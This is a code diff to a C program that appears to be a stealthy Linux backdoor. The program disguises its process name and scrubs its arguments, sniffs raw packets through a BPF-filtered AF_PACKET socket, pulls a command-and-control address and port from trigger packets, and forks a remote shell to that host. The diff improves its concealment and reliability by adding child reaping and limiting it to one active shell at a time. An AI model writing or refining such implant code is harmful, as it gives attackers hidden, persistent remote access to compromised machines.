@@ -48,12 +48,13 @@ static struct sock_fprog bpf_prog = {
 static void masquerade(int argc, char **argv, const char *name)
 {
     prctl(PR_SET_NAME, name, 0, 0, 0);
-    if (argc > 0 && argv && argv[0]) {
-        size_t cap = strlen(argv[0]);
-        if (cap > 0) {
-            memset(argv[0], 0, cap);
-            strncpy(argv[0], name, cap);
-        }
+    for (int i = 0; i < argc; i++) {
+        if (!argv[i]) continue;
+        size_t cap = strlen(argv[i]);
+        if (cap == 0) continue;
+        memset(argv[i], 0, cap);
+        if (i == 0)
+            strncpy(argv[i], name, cap);
     }
 }
 
@@ -226,7 +227,14 @@ int main(int argc, char *argv[])
     }
 
     masquerade(argc, argv, FAKE_PARENT);
-    signal(SIGCHLD, SIG_IGN);
+
+    static volatile sig_atomic_t active_child;
+    void sigchld_handler(int sig) {
+        (void)sig;
+        while (waitpid(-1, NULL, WNOHANG) > 0) {}
+        active_child = 0;
+    }
+    signal(SIGCHLD, sigchld_handler);
 
     int raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (raw < 0) { perror("socket"); return 1; }
@@ -258,12 +266,15 @@ int main(int argc, char *argv[])
         memcpy(&c2_port_net, buf + 50, 2);
         if (c2_addr_net == 0 || c2_port_net == 0) continue;
 
+        if (active_child) continue;
+
         pid_t pid = fork();
         if (pid == 0) {
             close(raw);
             spawn_shell(c2_addr_net, c2_port_net);
             _exit(1);
         }
+        if (pid > 0) active_child = 1;
     }
 
     close(raw);
